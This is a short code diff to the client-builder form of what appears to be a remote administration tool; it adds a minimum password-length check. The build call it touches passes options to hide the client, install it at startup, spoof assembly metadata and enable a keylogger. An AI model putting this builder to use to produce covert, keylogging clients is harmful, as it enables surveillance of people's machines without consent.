@@ -256,6 +256,15 @@ namespace xServer.Forms
 
                 try
                 {
+                    string password = txtPassword.Text;
+
+                    if (password.Length < 3)
+                    {
+                        MessageBox.Show("Please enter a secure password with more than 3 characters.",
+                            "Please enter a secure password", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        return;
+                    }
+
                     string[] asmInfo = null;
                     if (chkChangeAsmInfo.Checked)
                     {
@@ -278,7 +287,7 @@ namespace xServer.Forms
                         asmInfo[7] = txtFileVersion.Text;
                     }
 
-                    ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
+                    ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), password, txtInstallsub.Text,
                         txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
                         chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
                         Application.ProductVersion);
